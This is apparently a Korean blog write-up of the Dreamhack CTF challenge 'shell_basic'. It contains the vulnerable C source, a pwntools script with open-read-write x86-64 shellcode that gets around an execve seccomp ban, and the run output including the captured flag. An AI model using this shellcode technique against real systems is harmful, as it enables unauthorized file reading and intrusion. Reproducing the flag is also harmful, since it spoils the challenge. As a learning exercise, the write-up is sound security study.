---
layout: posts
title: "shell_basic"
categories: ["CTF"]
---
## 문제

입력한 셸코드를 실행하는 프로그램이 서비스로 등록되어 작동하고 있습니다.

`main` 함수가 아닌 다른 함수들은 execve, execveat 시스템 콜을 사용하지 못하도록 하며, 풀이와 관련이 없는 함수입니다.

flag 파일의 위치와 이름은 `/home/shell_basic/flag_name_is_loooooong`입니다.

감 잡기 어려우신 분들은 아래 코드를 가지고 먼저 연습해보세요!

플래그 형식은 `DH{...}` 입니다. `DH{`와 `}`도 모두 포함하여 인증해야 합니다.

## 해결

```bash
┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0310]
└─$ cat shell_basic.c
// Compile: gcc -o shell_basic shell_basic.c -lseccomp
// apt install seccomp libseccomp-dev

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}

void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}

void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  void (*sc)();

  init();

  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```

 

```python
cat ./exploit.py
from pwn import *

context.log_level = "info"
context.arch = 'amd64'

io = remote ("host3.dreamhack.games", 24081)

shellcode = '''
xor rax, rax
push rax

mov rax, 0x676e6f6f6f6f6f6f
push rax
mov rax, 0x6c5f73695f656d61
push rax
mov rax, 0x6e5f67616c662f63
push rax
mov rax, 0x697361625f6c6c65
push rax
mov rax, 0x68732f656d6f682f
push rax

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
sub rsi, 0x30
mov rdx, 0x30
mov rax, 0
syscall

mov rdi, 1
mov rax, 1
syscall
'''

payload = asm(shellcode)

io.send(payload)

print(io.recvall().decode('utf-8', errors = 'ignore'))
```

shellcode 에 `/home/shell_basic/flag_name_is_loooooong` 를 little endian 으로 넣어주었다.

**open** → **read** → **write**

```powershell
┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0310]
└─$ python3 ./exploit.py
[+] Opening connection to host3.dreamhack.games on port 24081: Done
[+] Receiving all data: Done (59B)
[*] Closed connection to host3.dreamhack.games port 24081
shellcode: DH{ca562d7cf1db6c55cb11c4ec350a3c0b}
\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
```
